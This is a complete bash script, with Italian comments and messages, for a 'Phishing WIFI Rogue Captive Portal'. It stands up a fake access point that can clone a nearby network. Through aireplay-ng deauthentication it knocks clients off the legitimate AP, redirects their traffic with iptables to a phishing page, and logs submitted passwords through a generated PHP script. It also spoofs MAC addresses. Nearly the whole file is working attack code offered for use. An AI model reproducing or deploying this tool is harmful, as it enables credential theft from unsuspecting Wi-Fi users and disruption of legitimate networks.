#!/bin/bash

if [ "$EUID" -ne 0 ]; then
   echo ""
   echo "Please run as root"
   exit 1
fi

dmesg -D # Remove verbose log out in tty

tool_program="`echo $0 | sed -se 's/.*\///; s/\.sh$//'`"
PID="`pgrep $tool_program.sh`"
config_apache="default.conf"
LOG="/tmp/rogueportal.log"
i_wireless=""
i_deauth=""
mon_deauth=""
channel="$(($(($RANDOM%11))+1))" # Default
persistent_connection=0   # Mantiene la connessione attiva permettendo al client di poter navigare in internet sul nostro AP malevolo
mac_device=""		  # Mac address dell'interfaccia di rete
mac_device_deauth=""	  # Mac address dell'interfaccia di rete di deauth
mac_target=""		  # Mac address di destinazione
mac_chng=""		  # Mac address fake
ssid_portal=""
clone=0
attack=0
phishing_page=
page_p=()
for page in `cd $PWD/phishing_pa* && ls -dx1 */`; do page_p+=($page); done

function logo() {

cat <<EOF

 _________.                            ___.                                       
 \______   \ ____   ____  __ __   ____/  _ \___________._.______.______.___       
  |       _//  _ \ / ___\|  |  \./ __ \ <_> \   . \ <_> )\__  ___\  <_> \  \      
  |    |   (  <_> ) /_/  >  |  /\  ___/\   / \ <_> \   _/_  \  \  \   _  \  \__.  
  |____|_  /\____/\___  /|____/  \___  >\  \  \_____\  \  \  \__\  \___\\___\_____> 
         \/      /_____/             \/  \__\        \_/\_/

                * A Phishing WIFI Rogue Captive Portal! Enjoy! *

EOF

}

function help() {
   echo " Usage: wifi.sh -w [wireless-device] -e [AP network name/target] -f [Page Phishing]";
   echo ""
   echo " -w		Interfaccia Wireless"
   echo " -e		ESSID della rete"
   echo " -f 		Numero pagina di phishing. Accetta solo valore numerico"
   echo "                Digita '$0 -l'"
   echo ""
   echo " [ OPTIONAL ]"
   echo ""
   echo " -l		Lista delle pagine di phishing disponibili"
   echo " -c		Canale della rete"
   echo " -m		Mac address da utilizzare"
   echo " -C		Imposta la clonazione dell'AP se trova l'essid, impostato con l'opzione '-e',"
   echo "		nelle vicinanze"
   echo " -p		Mantiene la connessione dopo aver catturato le password. Di default lo script"
   echo "		si chiude automaticamente"
   echo " -a		Attacca la rete scollegando i client dell'AP legittimo per"
   echo "		farli collegare all'AP Rogue. Come argomento, necessita di una"
   echo "		seconda scheda di rete per il deauth"
   echo ""
}

function control_c_sigterm() {
  echo ""
  echo -e "\e[91mCTRL C Detected! Kill $PID ($tool_program)\e[0m"
  echo -e "\e[91mExiting!\e[0m"
  cleanup
  exit $?
}

function cleanup() {

   echo -en "\e[91mCleaning up and exiting\e[0m\n\n"

   echo -e "\e[32m- Flush iptables\e[0m"
   flush_iptables

   echo -e "\e[32m- Killing dnsmasq\e[0m"
   killall -g dnsmasq &> /dev/null

   echo -e "\e[32m- Killing hostapd\e[0m"
   killall -g hostapd &> /dev/null

   if [ $attack -eq 1 ]; then
      echo -e "\e[32m- Stop monitor mode $mon_deauth\e[0m"
      airmon-ng stop $mon_deauth &> /dev/null
   fi

   flush_device

   if [ ! -z $mac_chng ]; then
      echo -e "\e[32m- Remove fake mac address\e[0m"
      ifconfig $i_wireless down
      macchanger -m `macchanger wlan0 | grep -i permanent | cut -d" " -f3` $i_wireless &> /dev/null
   fi

   a2dissite $config_apache &> /dev/null
   a2ensite 000-default.conf &> /dev/null

   service apache2 restart &> /dev/null

   if [ -d /var/www/html/data/${page_p[$phishing_page]} ] && [ -f /var/www/html/data/${page_p[$phishing_page]}password.txt ]; then
      echo -e "\n\e[32m[ * ]\e[0m \e[91mSono state catturate delle password! (`du /var/www/html/data/${page_p[$phishing_page]}password.txt | sed -s 's/[[:space:]]/ /' | cut -d" " -f 1`KB)\e[0m"
      cat /var/www/html/data/${page_p[$phishing_page]}password.txt >> $PWD/password.txt
   else
      echo -e "\n\e[91m[ ! ] Nessuna password catturata\e[0m"
   fi

   rm -rf /var/www/html/data/*

   sync
   dmesg -E

   exit $?
}

function db_evilconnect() {
cat <<EOF
 <?php
\$pid="$PID";
\$type=$_POST['type'];
\$email=$_POST['email'];
\$password=\$_POST['password'];

file_put_contents('password.txt', file_get_contents('php://input'), FILE_APPEND);
file_put_contents('password.txt', "\n", FILE_APPEND);

\$ip = \$_SERVER['REMOTE_ADDR'];
\$mac = shell_exec('sudo -u www-data /usr/sbin/arp -an ' . \$ip);
preg_match('/..:..:..:..:..:../',\$mac , \$matches);
\$arp=@\$matches[0];

if ( ! file_exists('password.txt') ) {
   header('Location: ' . \$_SERVER['HTTP_REFERER']);
}
EOF

}

function flush_iptables() {
   iptables -t nat -F
   iptables -t nat -X
   iptables -t nat -Z

   iptables -t mangle -F
   iptables -t mangle -X
   iptables -t mangle -Z

   iptables -F
   iptables -X
   iptables -Z
}

function flush_device() {

   killall -g wpa_supplicant &> /dev/null
   rfkill unblock all
   ifdown $i_wireless &> /dev/null
   ifconfig $i_wireless down &> /dev/null
   dhclient -r $i_wireless &> /dev/null
   ip addr flush dev $i_wireless &> /dev/null
   ifconfig $i_wireless up

   if [ ! -z $i_deauth ]; then
      ifdown $i_deauth &> /dev/null
      ifconfig $i_deauth down &> /dev/null
      ip addr flush dev $i_deauth &> /dev/null
      dhclient -r $i_deauth &> /dev/null
      ifconfig $i_deauth up
   fi
}

function mac_change() {
   flush_device
   ifconfig $i_wireless down
   macchanger --mac $mac_chng $i_wireless &> /dev/null
   ifconfig $i_wireless up
}

function a_deauth() {

   airmon-ng check kill &> /dev/null

   echo -e "\e[32m* Enabling monitor mode '$i_deauth'\e[0m"
   airmon-ng start $i_deauth &> /dev/null

   mon_deauth="`airmon-ng | awk '{print $2}' | grep -i mon`"

   ## Attack Deauth all client for AP
   echo -e "\e[32m* Starting attack '$ssid_portal($mac_target)'\e[0m"

   iw dev $mon_deauth set channel $channel
   aireplay-ng -0 0 -a $mac_target $mon_deauth </dev/null &> /dev/null &
   disown
}

function rules_iptables() {
   echo 1 > /proc/sys/net/ipv4/ip_forward

   iptables -t mangle -N captiveportal
   iptables -t mangle -A PREROUTING -i $i_wireless -p udp --dport 53 -j RETURN
   iptables -t mangle -A PREROUTING -i $i_wireless -j captiveportal
   iptables -t mangle -A captiveportal -j MARK --set-mark 1
   iptables -t nat -A PREROUTING -i $i_wireless -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
   iptables -t nat -A PREROUTING -i $i_wireless -p tcp -j DNAT --to-destination 10.0.0.1:80
   iptables -A FORWARD -i $i_wireless -j ACCEPT
   iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Check Dependecies

if ! command -v aircrack-ng &> /dev/null || ! command -v dnsmasq &> /dev/null || ! command -v apache2 &> /dev/null || ! command -v hostapd &> /dev/null || ! command -v iwlist &> /dev/null || ! command -v php &> /dev/null || ! command -v macchanger &> /dev/null || ! command -v nohup &> /dev/null || ! command -v sudo &> /dev/null || ! command -v killall &> /dev/null || ! command -v rfkill &> /dev/null; then
   echo "Mancano alcune dipendenze. Installale prima di continuare"
   exit 1
fi

logo

[ $# -eq 0 ] && { help ; exit 1; }

while getopts "w:e:a:Cf:m:c:lp" arg; do
   case $arg in

     w)
          i_wireless=$OPTARG
          find /sys/class/net ! -type d |  grep "\<$i_wireless\>" &> /dev/null

          if  [ "$?" != "0" ]; then
             echo "Interfaccia '$i_wireless' non trovata"
             exit 1
          fi

          phy_wireless="`iw dev | grep -B1 $i_wireless | head -n 1 | tr -d '#'`"

          iw $phy_wireless info | grep -E '\<AP\>$' &> /dev/null

          if [ "$?" != "0" ]; then
             echo "A quanto pare il device '$i_wireless' non supporta la modalità AP (AccessPoint)"
             exit 1
          fi

          mac_device="`ifconfig $i_wireless | grep -A1 $i_wireless | grep ether | sed -s 's/^[[:space:]]*//' | cut -d" " -f 2`"
          ;;
     e)
          ssid_portal=$OPTARG
          ;;
     l)
          echo -e "Trovate le seguenti pagine di phishing:\n"
          echo ${page_p[@]} | sed -se 's/\///g; s/[[:space:]]/\n/' | awk '{ print"\t\t(" NR-1 ") " $0}'
          echo ""
          exit 0
          ;;
     a)
          attack=1
          i_deauth="$OPTARG"

          find  /sys/class/net ! -type d |  grep "\<$i_deauth\>" &> /dev/null

          if  [ "$?" != "0" ]; then
             echo "Interfaccia '$i_deauth' non trovata"
             exit 1
          fi

          phy_wireless="`iw dev | grep -B1 $i_deauth | head -n 1 | tr -d '#'`"

          iw $phy_wireless info | grep -E '\<monitor\>$' &> /dev/null

          if [ "$?" != "0" ]; then
             echo "A quanto pare il device '$i_deauth' non supporta il monitor mode"
             exit 1
          fi

          mac_device_deauth="`ifconfig $i_deauth | grep -A1 $i_deauth | grep ether | sed -s 's/^[[:space:]]*//' | cut -d" " -f 2`"
          ;;
     c)
          channel=$OPTARG
          ;;
     m)
          mac_chng=$OPTARG
          ;;
     C)
          clone=1
          ;;
     p)
     	  persistent_connection=1
	  ;;
     f)
    	  phishing_page=$OPTARG

          echo "$phishing_page" | grep -E "^[0-9]" &> /dev/null

          if [ "$?" != "0" ]; then
             echo "Questa opzione accetta solo valori numerici"
             exit 1
          fi

    	  if [ "$OPTARG" -gt ${#page_p[@]} ]; then
    	     echo "Non è stata trovata nessuna pagina di phishing con questo indicativo($OPTARG)"
    	     exit 1
    	  fi
    	  ;;
     *)
          help
          exit 1
          ;;
    esac
done

if [ $OPTIND -eq 1 ]; then
   help
   exit 1
fi

shift "$((OPTIND-1))"

if [ -z "$ssid_portal" ]; then
   echo "Impostare l'ESSID della rete"
   exit 1
fi
if [ -z "$i_wireless" ]; then
   echo "Impostare un interfaccia wireless"
   exit 1
fi
if [ -z "$phishing_page" ]; then
   echo "Impostare una pagina di phishing"
   echo "Digita '$0 -l'"
   exit 1
fi

echo $PID > /tmp/$tool_program.pid && chown www-data:www-data /tmp/$tool_program.pid

trap control_c_sigterm SIGINT

flush_device
flush_iptables

if [ $clone -eq 1 ]; then
   iwlist $i_wireless scan | grep ESSID | grep -E "\<$ssid_portal\>" &> /dev/null

   if [ "$?" != "0" ]; then
       echo "Non c'è nessun AP con un ESSID chiamato '$ssid_portal'"
       exit 1
   fi

   # Getting information of AP TARGET
   if [ $attack -eq 1 ]; then
      ssid_portal="`iwlist $i_deauth scan | egrep -i 'ssid' | grep $ssid_portal | sed -s 's/[[:space:]]*//' | grep -i essid | sed -s 's/\"//g' | cut -d':' -f 2`"
      channel="`iwlist $i_deauth scan | egrep -i 'ssid|channel|address' | grep -B4 $ssid_portal | sed -s 's/[[:space:]]*//' | grep -Ei ^channel | cut -d':' -f 2`"
      mac_target="`iwlist $i_deauth scan | egrep -i 'ssid|channel|address' | grep -B4 $ssid_portal | sed -s 's/[[:space:]]*//' | grep -i addres | cut -d' ' -f 5`"
   else
      ssid_portal="`iwlist $i_wireless scan | egrep -i 'ssid' | grep $ssid_portal | sed -s 's/[[:space:]]*//' | grep -i essid | sed -s 's/\"//g' | cut -d':' -f 2`"
      channel="`iwlist $i_wireless scan | egrep -i 'ssid|channel|address' | grep -B4 $ssid_portal | sed -s 's/[[:space:]]*//' | grep -Ei ^channel | cut -d':' -f 2`"
      mac_target="`iwlist $i_wireless scan | egrep -i 'ssid|channel|address' | grep -B4 $ssid_portal | sed -s 's/[[:space:]]*//' | grep -i addres | cut -d' ' -f 5`"
  fi

fi

if [ $attack -eq 1 ] && [ $clone -eq 0 ]; then
   echo "Per l'attacco è necessario l'opzione '-C'"
   exit 1
fi

service dnsmasq stop &> /dev/null
service hostapd stop &> /dev/null

killall -g dnsmasq 2> /dev/null
killall -g hostapd 2> /dev/null

echo -e "\e[91mESSID:'$ssid_portal($mac_target)', CANALE:'$channel', INTERFACCIA AP:'$i_wireless', MAC INTERFACCIA:'$mac_device', MAC INTERFACCIA DEAUTH:'$i_deauth($mac_device_deauth)', PISHING PAGE:'`echo ${page_p[$phishing_page]} | tr [a-z] [A-Z] | sed -s 's/\///'`'\e[0m"
echo ""

sleep 2

if [ ! -z $mac_chng ]; then
   echo -e "\e[32m* Change mac in '$mac_chng' address for device '$i_wireless'"
   mac_change
fi

echo -e "\e[32m+ Creating hostapd.conf\e[0m"
echo -e "interface=$i_wireless\ndriver=nl80211\nssid=$ssid_portal\nchannel=$channel\nauth_algs=1\n" > /tmp/hostapd.conf

echo -e "\e[32m+ Creating dnsmasq.conf\e[0m"
echo -e "bind-interfaces\ninterface=$i_wireless\ndhcp-range=10.0.0.2,10.0.0.254,2h\ndhcp-option=option:router,10.0.0.1\ndhcp-authoritative\n" > /tmp/dnsmasq.conf

echo -e "\e[32m+ Creating apache2 site for '`echo ${page_p[$phishing_page]} | tr [a-z] [A-Z] | sed -s 's/\///'`' phishing page\e[0m"
echo    "<VirtualHost *:80>" > /etc/apache2/sites-available/$config_apache
echo -e "\tDocumentRoot /var/www/html/data/`echo ${page_p[$phishing_page]} | sed -s 's/\///'`" >> /etc/apache2/sites-available/$config_apache
echo    "</VirtualHost>" >> /etc/apache2/sites-available/$config_apache
if [ ! -d /var/www/html/data ]; then
   mkdir /var/www/html/data
fi
cd $PWD/phishing_pages
rm -rf /var/www/html/data/* &> /dev/null
cp -R ${page_p[$phishing_page]} /var/www/html/data
#rm -rf /var/www/html/data/${page_p[$phishing_page]}password.txt
db_evilconnect > db_evilconnect.php

# Check persistence connection
if [[ $persistent_connection -eq 1 ]]; then
   echo '
shell_exec("sudo iptables -t nat -I PREROUTING -p tcp -m mac --mac-source ".$arp." -j ACCEPT");
shell_exec("sudo iptables -t mangle -I captiveportal 1 -m mac --mac-source ".$arp." -j RETURN 2>&1");
header("Location: https:\/\/www.google.com");
   ' >> db_evilconnect.php
else
   echo '
shell_exec("sudo killall -SIGINT -g rogueportal.sh");
   ' >> db_evilconnect.php
fi

mv db_evilconnect.php /var/www/html/data/${page_p[$phishing_page]}/
cd - &> /dev/null
chown www-data:www-data -R /var/www/html/data
chmod 777 -R /var/www/html/data

a2dissite 000-default.conf &> /dev/null
a2ensite $config_apache &> /dev/null

echo -e "\e[32m* Adding routes to iptables\e[0m"
rules_iptables

echo -e "\e[32m* Starting apache\e[0m"
service apache2 restart

echo -e "\e[32m* Configuring $i_wireless\e[0m"
ifconfig $i_wireless up
ifconfig $i_wireless 10.0.0.1 netmask 255.255.255.0

echo -e "\e[32m* Starting dnsmasq\e[0m"
dnsmasq -C /tmp/dnsmasq.conf

if [ "$?" != "0" ]; then
   kill -SIGINT $PID
   echo "Problema nell'avviare dnsmasq"
   exit 1
fi

echo -e "\e[32m* Starting hostapd (log in /tmp/hostapd.log)\e[0m"
> $LOG
hostapd -B /tmp/hostapd.conf -f $LOG -t

if [ "$?" != "0" ]; then
   kill -SIGINT $PID
   echo "Problema nell'avviare hostapd. Controlla se la scheda di rete non è gia in uso o support il driver 'nl80211'"
   exit 1
fi

if [ $attack -eq 1 ]; then
   a_deauth
fi

echo -e "\n"

tail -f $LOG | while read CLIENT; do
   echo $CLIENT | grep AP-STA-CONNECTED &> /dev/null

   if [ "$?" == "0" ]; then
      printf "\e[32m[ $tool_program ] [ `date +%d/%m/%Y" "%H:%M` ]  New client `echo $CLIENT | grep AP-STA-CONNECTED | cut -d" " -f 4` connected!\e[0m"
      vendor="`echo $CLIENT | grep AP-STA-CONNECTED | cut -d" " -f 4 | sed -s 's/://g' | tr '[a-f]' '[A-F]' | cut -c 1-6`"
      echo -e "\e[32m\t( `cat mac_vendor.txt | grep $vendor | sed -s 's/[[:space:]]/\t/' | cut -f2-` )\e[0m"
   fi

   echo $CLIENT | grep AP-STA-DISCONNECTED &> /dev/null

   if [ "$?" == "0" ]; then
      printf "\e[32m[ $tool_program ] [ `date +%d/%m/%Y" "%H:%M` ]\e[0m\e[91m Client `echo $CLIENT | grep AP-STA-DISCONNECTED | cut -d" " -f 4` disconnected!\e[0m"
      vendor="`echo $CLIENT | grep AP-STA-DISCONNECTED | cut -d" " -f 4 | sed -s 's/://g' | tr '[a-f]' '[A-F]' | cut -c 1-6`"
      echo -e "\e[32m\t( `cat mac_vendor.txt | grep $vendor | sed -s 's/[[:space:]]/\t/' | cut -f2-` )\e[0m"
   fi

done
